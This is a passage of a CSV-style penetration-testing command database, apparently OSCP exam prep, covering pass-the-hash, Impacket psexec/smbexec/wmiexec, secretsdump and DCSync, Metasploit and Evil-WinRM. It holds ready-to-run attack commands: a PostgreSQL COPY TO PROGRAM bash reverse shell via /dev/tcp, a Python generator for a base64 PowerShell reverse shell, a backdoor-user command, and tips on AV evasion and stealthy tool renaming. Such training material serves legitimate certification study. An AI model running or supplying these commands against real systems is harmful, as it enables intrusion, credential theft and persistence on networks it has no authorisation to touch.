Switch method (wmiexec → smbexec)

FORENSIC ARTIFACTS:
- Event ID 4624:
Network logon
- Event ID 4672:
Special privileges
- WMI logs:
If using wmiexec method
- Service creation:
If using smbexec method
- Task creation (Event 4698):
If using atexec
- Process creation (Event 4688):
For spawned processes","high"
"pth-verify-hash-format","Pass-the-Hash - Verify Hash Format","active-directory","crackmapexec smb <TARGET> -u <USER> -H <NTLM_HASH>","Test if NTLM hash is valid format and works for authentication before exploitation","lateral-movement","OSCP TRAINING MATERIAL - HASH VERIFICATION BEFORE EXPLOITATION:
WHY VERIFY FIRST:
Always test hash validity before attempting lateral movement.

Saves exam time by catching errors early (invalid format, wrong user, UAC restrictions, etc.).

WHAT IS HASH VERIFICATION:
Using CrackMapExec to test if NTLM hash is valid format and grants access before committing to full exploitation tool (PSExec, WMIExec, etc.).

BEST PRACTICE WORKFLOW:
1.

Obtain NTLM hash (secretsdump, Mimikatz, etc.)
2.

VERIFY with crackmapexec (fast, <10 seconds)
3.

Check for (Pwn3d!) indicator
4.

If success, proceed with lateral movement tool
5.

If failure, troubleshoot hash/credentials

NTLM HASH FORMAT:
- Length:
32 hexadecimal characters (128 bits)
- Character set:
0-9, A-F (case insensitive)
- Example:
2892D26CDF84D7A70E2EB3B9F05C425E
- No colons, spaces, or special characters

COMMON HASH FORMATS IN DUMPS:
Secretsdump output format:
```
Administrator:500:aad3b435b51404eeaad3b435b51404ee:2892D26CDF84D7A70E2EB3B9F05C425E:::
```
Fields:
USERNAME:RID:LM_HASH:NTLM_HASH:::
Extract NTLM hash (4th field after 3rd colon):
- LM hash:
aad3b435b51404eeaad3b435b51404ee (disabled/empty)
- NTLM hash:
2892D26CDF84D7A70E2EB3B9F05C425E (use this)

LM vs NTLM:
- LM hash:
Legacy (pre-Windows Vista), weak, often disabled
- NTLM hash:
Modern (Windows Vista+), 128-bit MD4, used for authentication
- Empty LM:
aad3b435b51404eeaad3b435b51404ee indicates LM disabled
- Only NTLM needed for pass-the-hash on modern systems

Mimikatz output format:
```
Username :
Administrator
Domain   :
CORP
NTLM     :
2892d26cdf84d7a70e2eb3b9f05c425e
```
Extract from ""NTLM"" line.

CrackMapExec SAM dump format:
```
SMB    192.168.50.73    445    FILES04    Administrator:500:aad3...:2892...:::
```
Same format as secretsdump - use 4th field.

OUTPUT INTERPRETATION:
Success with admin access:
```
SMB    192.168.50.73    445    FILES04    [+] CORP\Administrator:2892D...

(Pwn3d!)
```
(Pwn3d!) = Hash grants local administrator access.

Success without admin:
```
SMB    192.168.50.75    445    WEB01      [+] CORP\jen:369def...
```
[+] without (Pwn3d!) = Authentication succeeded but user lacks admin privileges.

Failure:
```
SMB    192.168.50.76    445    DB01       [-] CORP\Administrator:2892D...

STATUS_LOGON_FAILURE
```
[-] = Hash invalid, username wrong, or account disabled.

VERIFICATION COMMAND:
```bash
crackmapexec smb 192.168.50.73 -u Administrator -H 2892D26CDF84D7A70E2EB3B9F05C425E
```

CRACKMAPEXEC ADVANTAGES:
- Fast:
<10 seconds per host
- Clear output:
(Pwn3d!) indicator obvious
- Authentication only:
No command execution (stealthy)
- Multi-protocol:
Test SMB, WinRM, MSSQL, etc.
- Batch testing:
Test multiple hosts/hashes quickly

COMMON VERIFICATION ERRORS:
Invalid hash format:
```
[-] Invalid hash format
```
Fix:
Ensure 32 hex characters, no spaces/colons.

STATUS_LOGON_FAILURE:
```
[-] STATUS_LOGON_FAILURE
```
Causes:
- Hash extracted incorrectly (wrong field)
- Username doesn't match hash
- Account disabled
- Hash is LM not NTLM

No (Pwn3d!) despite [+]:
```
[+] CORP\jen:369def...


```
Authentication succeeded but user not local admin.

2014 UAC RESTRICTIONS:
Local admin hash blocked:
```
[+] CORP\localadmin:abc123...


```
No (Pwn3d!) because UAC blocks non-RID-500 local admins.

Workaround:
Use RID 500 Administrator or domain user.

HASH EXTRACTION FROM SECRETSDUMP:
Full command:
```bash
impacket-secretsdump CORP/Administrator:Password123!@192.168.50.73
```

Output:
```
[*] Dumping local SAM hashes (uid:rid:lmhash:nthash)
Administrator:500:aad3b435b51404eeaad3b435b51404ee:2892D26CDF84D7A70E2EB3B9F05C425E:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
```

Extract:
- Administrator hash:
2892D26CDF84D7A70E2EB3B9F05C425E
- Guest hash:
31d6cfe0d16ae931b73c59d7e0c089c0 (empty password)

USER:HASH MATCHING:
Critical:
Username must match the user whose hash you have.

Correct:
```bash
crackmapexec smb <TARGET> -u Administrator -H 2892D26CDF84D7A70E2EB3B9F05C425E
```

Incorrect:
```bash
crackmapexec smb <TARGET> -u jen -H 2892D26CDF84D7A70E2EB3B9F05C425E
```
Hash belongs to Administrator, not jen.

DOMAIN VS LOCAL AUTHENTICATION:
Default:
CME attempts domain authentication.

Force local:
```bash
crackmapexec smb <TARGET> -u Administrator -H <HASH> --local-auth
```

Explicit domain:
```bash
crackmapexec smb <TARGET> -u Administrator -H <HASH> -d CORP
```

VERIFY MULTIPLE HASHES:
Test all extracted hashes:
```bash
for hash in hash1 hash2 hash3; do
  crackmapexec smb 192.168.50.73 -u Administrator -H $hash
done
```

Find which hash works.

TIME ESTIMATE:
- Single verification:
<10 seconds
- Multiple hashes:
<1 minute
- Subnet spray:
1-2 minutes

EXAM STRATEGY:
1.

Extract all hashes from compromised system (secretsdump)
2.

Verify EACH hash with crackmapexec before exploitation
3.

Look for (Pwn3d!) - indicates admin access
4.

If hash fails, troubleshoot format before wasting time on full tools
5.

Once verified, proceed confidently with PSExec/WMIExec

DECISION TREE:
- (Pwn3d!):
Proceed with lateral movement (PSExec, WMIExec, etc.)
- [+] without Pwn3d:
User valid but not admin (try different user)
- [-]:
Hash/username invalid (re-extract hash, verify username)
- UAC blocked:
Switch to RID 500 or domain user

ALTERNATIVE VERIFICATION:
Test with Impacket directly (slower):
```bash
impacket-psexec -hashes :2892D26CDF84D7A70E2EB3B9F05C425E Administrator@192.168.50.73
```
But CrackMapExec faster for verification only.

FORENSIC ARTIFACTS (VERIFICATION):
Minimal footprint:
- Event ID 4624:
Network logon attempt (Type 3)
- Event ID 4625:
Failed logon (if hash invalid)
- No command execution artifacts
- Stealthy:
Authentication test only

VERIFICATION SAVES TIME:
Without verification:
1.

Attempt PSExec with invalid hash → 2 minutes wasted
2.

Troubleshoot why PSExec failed → 5 minutes wasted
3.

Re-extract hash → 2 minutes
4.

Retry PSExec → 2 minutes
Total:
11 minutes

With verification:
1.

Verify hash with CME → 10 seconds
2.

Identify problem immediately → 1 minute fix
3.

PSExec with correct hash → 2 minutes
Total:
3 minutes

Saved:
8 minutes (critical in 24-hour exam)","medium"
"impacket-psexec","Impacket PSExec - Remote Command Execution","exploitation","impacket-psexec '<DOMAIN>/<USERNAME>:<PASSWORD>@<TARGET>'","Execute commands on remote Windows system via SMB + MSRPC. Creates Windows service, provides interactive shell. Most versatile Impacket execution tool.","lateral-movement","MOST VERSATILE Impacket execution method. Provides interactive SYSTEM shell, file upload/download, and stable connection. WHEN TO USE: After validating admin credentials, for interactive post-exploitation (dumping SAM, searching files, installing persistence). WHY PSEXEC: Interactive shell is easier than semi-interactive wmiexec/smbexec. DISADVANTAGES: Writes RemComSvc.exe to disk (may trigger AV), creates Windows service (logged in Event ID 7045). Time estimate: 5-10 seconds for shell.

MANUAL ALTERNATIVES:

Pass-the-Hash (when you have NTLM hash):
impacket-psexec -hashes :<NTLM_HASH> 'corp.com/admin@192.168.50.75'

Local account authentication:
impacket-psexec './administrator:P@ssw0rd@192.168.50.75'

Kerberos authentication (requires TGT):
export KRB5CCNAME=admin.ccache
impacket-psexec -k -no-pass 'corp.com/admin@DC1.corp.com'

Execute single command and exit:
impacket-psexec 'corp.com/admin:pass@192.168.50.75' whoami

Use different service name (stealth):
Modify source: impacket-psexec changes service name in RemCom*.exe

AV EVASION: If PSExec blocked, use:
1. impacket-smbexec (creates service but no exe on disk)
2. impacket-wmiexec (pure WMI, no service, no exe)
3. CrackMapExec with --exec-method smbexec/wmiexec

COMMAND REFERENCE:
- Upload file: put local_file remote_path
- Download file: get remote_path local_file  
- Exit: exit or Ctrl+C

TIME ESTIMATE: 5-10 seconds (connection + shell), 1-2 seconds per command executed","high"
"impacket-smbexec","Impacket SMBExec - Fileless Remote Execution","exploitation","impacket-smbexec '<DOMAIN>/<USERNAME>:<PASSWORD>@<TARGET>'","Execute commands remotely via SMB service creation. Fileless alternative to psexec - creates service but no executable written to disk. Better AV evasion.","lateral-movement","BEST FOR AV EVASION. No executable written to disk - just service creation and deletion. WHEN TO USE: When psexec is blocked by AV, when you want lower forensic footprint, when ADMIN$ writeable but exe execution monitored. DISADVANTAGES: Semi-interactive shell (slower than psexec), output batched (not real-time), no file upload/download. WHY IT WORKS: Creates service pointing to cmd.exe with commands as parameters - Windows doesn't flag this as suspicious. Time estimate: 5-10 seconds per command (slower than psexec).

MANUAL ALTERNATIVES:

Pass-the-Hash:
impacket-smbexec -hashes :<NTLM_HASH> 'corp.com/admin@192.168.50.75'

Local account:
impacket-smbexec './administrator:P@ssw0rd@192.168.50.75'

PowerShell shell (better for modern commands):
impacket-smbexec -shell-type powershell 'corp.com/admin:pass@192.168.50.75'

Use local SMB server (if ADMIN$ disabled):
impacket-smbexec -mode server 'corp.com/admin:pass@192.168.50.75'

Single command execution:
impacket-smbexec 'corp.com/admin:pass@192.168.50.75' 'whoami /all'

COMPARISON:
psexec: Writes exe, interactive, fast, file transfer
smbexec: No exe, semi-interactive, slower, no file transfer, BETTER AV EVASION  
wmiexec: No exe, semi-interactive, different protocol (WMI), BEST AV EVASION

TIME ESTIMATE: 5-10 seconds per command (slower than psexec due to batched output)","high"
"impacket-wmiexec","Impacket WMIExec - WMI Remote Execution","exploitation","impacket-wmiexec '<DOMAIN>/<USERNAME>:<PASSWORD>@<TARGET>'","Execute commands remotely via Windows Management Instrumentation (WMI). Fileless, serviceless, stealthiest Impacket execution method. Uses DCOM on port 135 + ephemeral RPC.","lateral-movement","STEALTHIEST Impacket execution method. No exe, no service, uses WMI instead of SMB. WHEN TO USE: (1) Maximum stealth required, (2) SMB port 445 blocked but RPC available, (3) psexec/smbexec blocked by AV or HIPS. DISADVANTAGES: Semi-interactive (slower), no file transfer, requires RPC ports 135 + ephemeral. WHY STEALTHY: WMI is legitimate admin tool - creates Event ID 5857/5858 (WMI activity) instead of 7045 (service creation). Blends with normal sysadmin activity. Time estimate: 5-15 seconds per command.

MANUAL ALTERNATIVES:

Pass-the-Hash:
impacket-wmiexec -hashes :<NTLM_HASH> 'corp.com/admin@192.168.50.75'

Local account:
impacket-wmiexec './administrator:P@ssw0rd@192.168.50.75'

PowerShell shell (recommended):
impacket-wmiexec -shell-type powershell 'corp.com/admin:pass@192.168.50.75'

Fire-and-forget (no output retrieval):
impacket-wmiexec -nooutput 'corp.com/admin:pass@192.168.50.75' 'net user hacker P@ss123 /add'

Single command execution:
impacket-wmiexec 'corp.com/admin:pass@192.168.50.75' 'whoami /all'

WMI PERSISTENCE (advanced):
# Create WMI event subscription for persistence
impacket-wmiexec 'corp.com/admin:pass@192.168.50.75' 'powershell -c ""<WMI persistence payload>""'

COMPARISON TABLE:
PSExec: Fast, interactive, writes exe, creates service, SMB-only
SMBExec: Slower, semi-interactive, NO exe, creates service, SMB-only  
WMIExec: Slower, semi-interactive, NO exe, NO service, WMI protocol, STEALTHIEST

PORT REQUIREMENTS:
PSExec/SMBExec: TCP 445 (SMB)
WMIExec: TCP 135 (DCOM) + TCP 49152-65535 (ephemeral RPC)

TIME ESTIMATE: 5-15 seconds per command (slower than psexec, similar to smbexec)","high"
"impacket-secretsdump","Impacket Secretsdump - Credential Extraction","post-exploit","impacket-secretsdump '<DOMAIN>/<USERNAME>:<PASSWORD>@<TARGET>'","Extract credentials from Windows systems using multiple methods: DCSync (DRSUAPI), SAM dump, LSA secrets, cached credentials. Swiss-army knife for Windows credential extraction.","credential-dumping","SWISS-ARMY KNIFE for credential extraction. Automatically tries all methods - DCSync (if DC), SAM dump, LSA secrets, cached credentials. WHEN TO USE: (1) After gaining admin access, (2) For comprehensive credential harvest, (3) When unsure which extraction method to use. OSCP TIP: For exam, use targeted flags: -just-dc-user krbtgt (Golden Ticket), -sam (local accounts on workstations), -just-dc (full domain dump for labs). Automatic mode is comprehensive but noisier. Time estimate: 2-120 seconds depending on mode and domain size.

MANUAL ALTERNATIVES:

DCSync specific user (RECOMMENDED for OSCP):
impacket-secretsdump -just-dc-user krbtgt 'corp.com/admin:pass@192.168.50.70'

DCSync all domain users:
impacket-secretsdump -just-dc 'corp.com/admin:pass@192.168.50.70'

Local SAM dump (workstation/server):
impacket-secretsdump './administrator:P@ssw0rd@192.168.50.100' -sam

LSA secrets only (cached creds):
impacket-secretsdump './administrator:P@ssw0rd@192.168.50.100' -lsa

Pass-the-Hash:
impacket-secretsdump -hashes :<NTLM> 'corp.com/admin@192.168.50.70'

Offline NTDS.dit processing:
impacket-secretsdump -ntds ntds.dit -system system.hive LOCAL

Save output to files:
impacket-secretsdump -just-dc 'corp.com/admin:pass@dc' -outputfile corp_dump
# Creates: corp_dump.ntds, corp_dump.secrets, corp_dump.cached

USE CASES BY TARGET:
Domain Controller → -just-dc or -just-dc-user (DCSync)
Workstation/Server → -sam (local accounts) or default (tries all)
Offline NTDS.dit → -ntds + -system flags

OUTPUT PARSING:
Extract NTLM hashes only:
impacket-secretsdump -just-dc 'corp/admin:pass@dc' | cut -d':' -f4 > ntlm.txt

Find specific user:
impacket-secretsdump -just-dc 'corp/admin:pass@dc' | grep -i administrator

TIME ESTIMATE: 
DCSync single user: 2-10 seconds
DCSync full domain: 30 seconds - 15 minutes (size dependent)
SAM dump: 5-15 seconds
Automatic mode: 10-60 seconds","high"
"msf-db-init","Initialize Metasploit Database","exploitation","sudo msfdb init","Initialize PostgreSQL database for Metasploit Framework to enable persistent storage of hosts, services, credentials, and loot","metasploit","One-time setup per Kali installation.

Database persists across reboots and msfconsole sessions.

Enables workspace organization and automated storage of reconnaissance data.","high"
"msf-db-status","Check Metasploit Database Connection","exploitation","db_status","Verify database connectivity from within msfconsole","metasploit","Run this immediately after starting msfconsole to confirm database is accessible.

Without database, workspace features and automated storage will not function.","high"
"msf-console-start","Start Metasploit Console","exploitation","msfconsole -q","Start Metasploit Framework console in quiet mode (skip ASCII banner for faster startup)","metasploit","Console provides interactive interface to all Metasploit modules.

Use -q flag for faster startup during engagements.

Exit with 'exit' or Ctrl+C.","high"
"msf-console-resource","Start Metasploit Console with Resource Script","exploitation","msfconsole -q -r <RESOURCE_SCRIPT>","Start msfconsole and automatically execute commands from a resource script file","metasploit","Resource scripts automate repetitive tasks like setting up handlers, scanning, or post-exploitation.

Useful for consistent multi-engagement setups.","medium"
"msf-workspace-list","List Metasploit Workspaces","exploitation","workspace","Display all workspaces in the Metasploit database.
Current workspace is marked with asterisk.","metasploit","Workspaces organize data by engagement or target network.

Prevents mixing reconnaissance data from different assessments.","high"
"msf-workspace-create","Create Metasploit Workspace","exploitation","workspace -a <WORKSPACE_NAME>","Create new workspace to isolate hosts, services, and credentials for a specific engagement","metasploit","Creating a workspace automatically switches to it.

All subsequent reconnaissance data (hosts, services, creds) will be stored in this workspace.","high"
"msf-workspace-switch","Switch Metasploit Workspace","exploitation","workspace <WORKSPACE_NAME>","Switch to different workspace to access its stored hosts, services, and credentials","metasploit","Switching workspaces changes the context for all database queries (hosts, services, creds, loot).

Each workspace is isolated.","medium"
"msf-search-exploit","Search for Exploit Modules","exploitation","search <QUERY> type:exploit","Search Metasploit module database for exploits matching service, CVE, or keyword","metasploit","Use 'info <INDEX>' or 'info <MODULE_PATH>' for detailed module description before selection.

Rank 'excellent' indicates most reliable exploits.","high"
"msf-use-module","Activate Metasploit Module","exploitation","use <MODULE_PATH>","Load and activate a module for configuration and execution.
Module path or search index accepted.","metasploit","After 'use', all commands (set, show options, run) operate in context of this module.

Use 'back' to deselect module and return to main prompt.","high"
"msf-info-module","Display Module Information","exploitation","info <MODULE_PATH>","Show detailed information about a module including description, authors, references, targets, and options","metasploit","Review 'Rank' (reliability), 'Check supported' (can verify vulnerability before exploiting), and 'Module stability' before using unfamiliar modules.

'Module side effects' warns of log entries or artifacts.","high"
"msf-show-options","Display Module Options","exploitation","show options","List all configurable options for currently active module, including required settings and current values","metasploit","Focus on 'Required:
yes' options.

Some options auto-fill from previous sessions.

Use 'show missing' to see only unfilled required options.","high"
"msf-set-option","Set Module Option","exploitation","set <OPTION> <VALUE>","Configure a module option with specific value.
Setting applies to currently active module only.","metasploit","Common options:
RHOSTS (target IPs), RPORT (target port), LHOST (attacker IP), LPORT (attacker port).

RHOSTS accepts single IP, range (192.168.1.1-50), CIDR (192.168.1.0/24), or file:path.","high"
"msf-setg-option","Set Global Module Option","exploitation","setg <OPTION> <VALUE>","Set option value globally - applies to all modules in current msfconsole session","metasploit","Useful for attacker IP/port that stays constant across multiple exploits.

Global options don't persist across msfconsole restarts - use resource scripts for permanent settings.","medium"
"msf-back","Exit Current Module","exploitation","back","Deselect current module and return to main msfconsole prompt","metasploit","Module-specific options (set with 'set') are preserved if you return to same module.

Global options (set with 'setg') persist regardless.","medium"
"msf-db-import","Import Scan Results to Database","exploitation","db_import <SCAN_FILE>","Import nmap XML, nessus, or other scan formats into Metasploit database for automated host/service population","metasploit","Supported formats:
nmap XML (-oX), nessus (.nessus), nmap grepable (-oG with limitations).

XML format is most reliable.

After import, use 'hosts' and 'services' to verify data loaded correctly.","high"
"msf-db-nmap","Run Nmap from Metasploit","exploitation","db_nmap <NMAP_OPTIONS> <TARGET>","Execute nmap scan from within msfconsole and automatically import results to database","metasploit","db_nmap automatically imports results - no need for separate db_import.

Results are stored in current workspace.

Use standard nmap syntax - all flags supported.","high"
"msf-db-hosts","List Discovered Hosts","exploitation","hosts","Display all hosts stored in current workspace's database","metasploit","Use 'hosts -R' to automatically set RHOSTS option to all discovered hosts.

Filter with:
hosts -S <IP_PARTIAL> to find specific hosts.","high"
"msf-db-services","List Discovered Services","exploitation","services","Display all services (open ports) stored in current workspace's database","metasploit","Filter by port to find all hosts with specific service:
services -p 445.

Use 'services -p <PORT> -R' to auto-populate RHOSTS with all hosts running that service.","high"
"msf-db-vulns","List Discovered Vulnerabilities","exploitation","vulns","Display vulnerabilities identified by Metasploit modules and stored in database","metasploit","Vulnerabilities are added by check-capable modules and some auxiliary scanners.

Not all vulnerabilities are automatically detected - manual module execution may be required.","medium"
"msf-db-creds","List Stored Credentials","exploitation","creds","Display all captured credentials (passwords, hashes, tokens) stored in database","metasploit","Credentials automatically stored by modules like auxiliary/scanner/ssh/ssh_login, post/windows/gather/hashdump, load kiwi (mimikatz).

Export with:
creds -o creds.txt","high"
"evil-winrm-upload-file","Evil-WinRM Upload File to Target","exploitation","upload <LOCAL_FILE>","Upload file from local Kali machine to remote Windows target through Evil-WinRM session. Deploys tools (mimikatz, Rubeus, winPEAS) or payloads (shells, exploits) for execution. Default destination: Current working directory on remote system.","file-transfer","OSCP METHODOLOGY: File upload is MANDATORY for deploying tools on target systems. Evil-WinRM upload is preferred over HTTP transfer because: (1) No web server setup needed, (2) Works over WinRM (already established), (3) Simpler syntax than certutil/PowerShell.

TIME ESTIMATE: 30 seconds - 2 minutes (depending on file size)

FILE SIZE LIMITS:
- Small files (<5MB): Fast, no issues (mimikatz.exe ~1.2MB, winPEAS ~2MB)
- Medium files (5-20MB): May timeout on slow connections
- Large files (>20MB): Use alternative transfer methods (SMB, chunked HTTP)

COMMON FILES TO UPLOAD:
1. Mimikatz: /usr/share/windows-resources/mimikatz/x64/mimikatz.exe
2. winPEAS: /opt/winPEAS/winPEASx64.exe (enumeration)
3. Rubeus: /opt/Rubeus/Rubeus.exe (Kerberos attacks)
4. SharpHound: /opt/BloodHound/Collectors/SharpHound.exe (AD enumeration)
5. nc.exe: /usr/share/windows-binaries/nc.exe (reverse shells)
6. PowerUp.ps1: /opt/PowerSploit/Privesc/PowerUp.ps1 (Windows privesc)

OPTIMIZATION:
- Navigate to writable directory BEFORE uploading: cd C:\temp
- Rename suspicious tools: upload /path/mimikatz.exe mm.exe
- Verify upload success: ls; (Get-Item .\mm.exe).Length

EXAM TIP: Pre-stage common tools in organized directory on Kali (/opt/oscp-tools/) for fast access. Document full paths in cheat sheet.","high"
"evil-winrm-download-file","Evil-WinRM Download File from Target","exploitation","download <REMOTE_FILE>","Download file from remote Windows target to local Kali machine through Evil-WinRM session. Exfiltrate credentials, mimikatz output, BloodHound data, flags, or loot. Default destination: Current directory on local Kali system.","file-transfer","OSCP METHODOLOGY: Download ALL valuable data immediately after capture: flags, credentials, enumeration output, screenshots of successful exploits. Don't rely on maintaining access - download and document immediately.

TIME ESTIMATE: 30 seconds - 2 minutes (depending on file size)

COMMON FILES TO DOWNLOAD:
1. Flags: C:\Users\Administrator\Desktop\flag.txt, C:\Users\<USER>\Desktop\flag.txt
2. Mimikatz output: creds.txt, logonpasswords.txt
3. BloodHound data: bh.zip, *_BloodHound.zip
4. SAM/SYSTEM dumps: sam.save, system.save
5. NTDS.dit: ntds.dit (Domain Controller)
6. Configuration files: C:\inetpub\wwwroot\web.config, C:\Windows\Panther\Unattend.xml
7. Enumeration output: winPEAS.txt, PowerUp.txt

BEST PRACTICES:
- Verify before downloading: ls <file>; (Get-Item <file>).Length
- Organize locally: mkdir /home/kali/exam/<TARGET_IP>/loot
- Document in notes: Timestamp, source path, what it contains
- Check integrity: Get-FileHash -Algorithm MD5 <file> (remote) vs md5sum <file> (local)
- Clean up remote files after download: del <file> (OpSec)

FLAG RETRIEVAL WORKFLOW:
1. type C:\Users\Administrator\Desktop\flag.txt (verify content)
2. download C:\Users\Administrator\Desktop\flag.txt /home/kali/exam/target1/root-flag.txt
3. cat /home/kali/exam/target1/root-flag.txt (verify locally)
4. Submit flag
5. Screenshot for report

EXAM TIP: ALWAYS download flags AND important loot immediately. Don't wait until end of exam - machines may become unstable, connections may drop, or you may run out of time.","high"
"msf-show-payloads","List Compatible Payloads","exploitation","show payloads","Display all payloads compatible with currently selected exploit module","metasploit","Payloads with single slash (/) are staged, double underscore (_) indicates non-staged.

Choose based on space constraints and detection considerations.","high"
"msf-set-payload","Set Exploit Payload","exploitation","set payload <PAYLOAD_PATH>","Configure payload for currently selected exploit module","metasploit","Payload selection determines post-exploit capabilities.

Meterpreter payloads provide advanced features but are larger.

Shell payloads are simpler and smaller.","high"
"msf-set-lhost","Set Listener Host (Attacker IP)","exploitation","set LHOST <ATTACKER_IP>","Configure local IP address for reverse shell connection or bind shell interface","metasploit","Common mistake:
using wrong IP on multi-homed systems.

For VPN connections, use tun0 or VPN IP.

Can use interface name:
set LHOST tun0","high"
"msf-set-lport","Set Listener Port","exploitation","set LPORT <PORT>","Configure local port for listener (reverse shell) or bind port","metasploit","Default LPORT is 4444 (often blocked by firewalls).

Use ports 80, 443, or 53 for better success against egress filtering.

Requires root for ports < 1024.","high"
"msf-show-targets","Display Exploit Targets","exploitation","show targets","List available target configurations for exploit module (OS versions, architectures, methods)","metasploit","Target 0 is usually 'Automatic' detection.

Manual target selection more reliable if you know exact OS version.

Some modules have targets for different exploitation methods.","medium"
"msf-set-target","Set Exploit Target","exploitation","set target <TARGET_ID>","Manually select target configuration instead of relying on automatic detection","metasploit","Manual target selection recommended if automatic detection fails.

Choosing wrong target may crash service or fail silently.","medium"
"msf-exploit-check","Check Vulnerability Without Exploiting","exploitation","check","Verify target vulnerability without attempting exploitation (if module supports checking)","metasploit","Use 'check' before exploitation to verify vulnerability without risk of crashing service.

'Check supported:
Yes' shown in module info.

Some checks are version-based only (may have false positives/negatives).","high"
"msf-exploit-run","Run Exploit Module","exploitation","exploit","Execute the configured exploit module and launch payload","metasploit","Use 'exploit -j' to run in background and continue working.

Session auto-created on success.

Exploit failures common - try different payloads, targets, or manual exploitation.","high"
"msf-sessions-list","List Active Sessions","exploitation","sessions -l","Display all active sessions created by exploits or auxiliary modules","metasploit","Session IDs are sequential integers.

Type shows payload used (meterpreter, shell, etc).

Use session ID to interact with specific target.","high"
"msf-session-interact","Interact with Session","exploitation","sessions -i <SESSION_ID>","Switch to interactive mode with specified session","metasploit","Background active session with Ctrl+Z.

Sessions persist until explicitly killed or connection lost.

Multiple sessions manageable simultaneously.","high"
"msf-session-background","Background Active Session","exploitation","background","Send current session to background and return to msfconsole prompt","metasploit","Use Ctrl+Z as shortcut.

Session remains active in background.

Return to session with:
sessions -i <ID>","high"
"msf-jobs-list","List Background Jobs","exploitation","jobs","Display all running background jobs (exploits, handlers, auxiliary modules)","metasploit","Jobs are background tasks - exploits running with -j, multi/handler listeners, etc.

Jobs don't equal sessions - jobs create sessions.

Kill listener with:
jobs -k <ID>","medium"
"mysql-connect-basic","MySQL Database Connection","exploitation","mysql -h <TARGET> -P <PORT> -u <USERNAME> -p'<PASSWORD>'","Connect to MySQL/MariaDB database with credentials for enumeration and data extraction","database","MySQL default port:
3306.

Check information_schema for database structure.

Time estimate:
1-2 minutes.

OSCP tips:
(1) Enumerate databases:
SHOW DATABASES; (2) Look for:
users, admin, accounts, customers tables.

(3) Common columns:
username, password, email, hash.

(4) Extract hashes:
SELECT user,password FROM mysql.user; (5) Check file read permissions:
SELECT LOAD_FILE('/etc/passwd'); (6) UDF privilege escalation if admin:
linux-mysql-udf.

(7) For scripting:
mysql -h <TARGET> -u <USER> -p'<PASS>' -e 'SHOW DATABASES;'.

(8) Common usernames:
root, admin, dbuser, webapp.","high"
"postgres-connect-basic","PostgreSQL Database Connection","exploitation","psql -h <TARGET> -p <PORT> -U <USERNAME> -d <DATABASE>","Connect to PostgreSQL database with credentials for enumeration and potential code execution","database","PostgreSQL default port:
5432.

Default database:
postgres.

Default superuser:
postgres.

Time estimate:
1-2 minutes.

OSCP tips:
(1) List databases:
\l or SELECT datname FROM pg_database; (2) Connect to database:
\c <db> (3) List tables:
\dt or SELECT tablename FROM pg_tables WHERE schemaname='public'; (4) Check if superuser:
SELECT current_user, usesuperuser FROM pg_user WHERE usename=current_user; (5) File read (if superuser):
postgres-file-read.

(6) Command execution (if superuser):
COPY (SELECT '') TO PROGRAM 'bash -c ""bash -i >& /dev/tcp/<LHOST>/<LPORT> 0>&1""'; (7) For scripting:
PGPASSWORD='<PASS>' psql -h <TARGET> -U <USER> -d postgres -c 'SELECT version();'","high"
"wmi-creds-pscredential","Helper - Create PSCredential Object for WMI/WinRM","active-directory","$password = ConvertTo-SecureString '<PASS>' -AsPlainText -Force; $credential = New-Object System.Management.Automation.PSCredential('<USER>', $password)","Create PowerShell credential object for use in WMI, WinRM, and other remoting commands","lateral-movement","EDUCATIONAL CONTEXT:
PSCredential is PowerShell object encapsulating username and encrypted password for remote authentication.

WHY NEEDED:
Many PowerShell remoting cmdlets require PSCredential object, not plain strings.

SECURITY:
SecureString encrypts password in memory using DPAPI (Data Protection API) - not plaintext.

REUSABILITY:
Create $credential once at session start, reuse in multiple commands (Invoke-Command, New-PSSession, Invoke-WmiMethod, etc.).

ALTERNATIVE:
Get-Credential provides interactive prompt (better OPSEC - no password in command history or logs).

VERIFICATION:
Test credential with $credential.GetNetworkCredential().Password to view plaintext (debugging only).

BEHIND THE SCENES:
PSCredential stores username as string, password as SecureString (encrypted).

TIME ESTIMATE:
<30 seconds to create.

EXAM TIP:
Create credential object at start of session, reuse throughout lateral movement commands.

Saves typing and reduces errors.","high"
"revshell-ps-generator","Helper - Generate Base64 PowerShell Reverse Shell","active-directory","python3 -c ""import base64; LHOST='<LHOST>'; LPORT='<LPORT>'; payload = f'\$client = New-Object System.Net.Sockets.TCPClient(\'{LHOST}\',{LPORT});\$stream = \$client.GetStream();[byte[]]\$bytes = 0..65535|%{{0}};while((\$i = \$stream.Read(\$bytes, 0, \$bytes.Length)) -ne 0){{;\$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString(\$bytes,0, \$i);\$sendback = (iex \$data 2>&1 | Out-String );\$sendback2 = \$sendback + \""PS \"" + (pwd).Path + \""> \"";\$sendbyte = ([text.encoding]::ASCII).GetBytes(\$sendback2);\$stream.Write(\$sendbyte,0,\$sendbyte.Length);\$stream.Flush()}};\$client.Close()'; encoded = base64.b64encode(payload.encode('utf16')[2:]).decode(); print(encoded)""","Python one-liner to generate base64-encoded PowerShell reverse shell with custom LHOST/LPORT for lateral movement","lateral-movement","EDUCATIONAL CONTEXT:
One-liner Python script to generate ready-to-use base64-encoded PowerShell reverse shell.

WHY USE THIS:
Fast payload generation during exploitation, customizable LHOST/LPORT for different scenarios.

HOW IT WORKS:
1) TCPClient connects to LHOST:LPORT, 2) Loop reads commands from attacker, 3) Execute with iex (Invoke-Expression), 4) Send output back over TCP, 5) Repeat until connection closed.

PAYLOAD STRUCTURE:
TCP connection → GetStream → Read commands → Execute → Send output → Loop.

BASE64 ENCODING:
Avoids command-line escaping issues, bypasses basic signature detection (not AV-proof).

UTF-16LE REQUIREMENT:
PowerShell -EncodedCommand expects UTF-16 Little Endian encoding with BOM removed.

OBFUSCATION:
Base64 provides basic evasion but not sophisticated AV bypass.

USAGE:
Copy output, use in lateral movement command like:
powershell -nop -w hidden -e <BASE64>.

TIME ESTIMATE:
<1 minute for generation + execution.

EXAM TIP:
Save as script file (generate_revshell.py) for quick access.

Pre-generate payloads for common LHOST values (tun0 IP) before exam start.","high"
"nc-listener-tcp","Helper - Netcat TCP Listener for Reverse Shells","active-directory","nc -lvnp <LPORT>","Start Netcat listener on Kali to catch incoming reverse shell connections from lateral movement payloads","lateral-movement","EDUCATIONAL CONTEXT:
Netcat listener is essential component of reverse shell workflow - attacker-side receiver for callbacks.

WHY REVERSE SHELL:
Target connects back to attacker (bypasses inbound firewall rules).

COMMON PORTS:
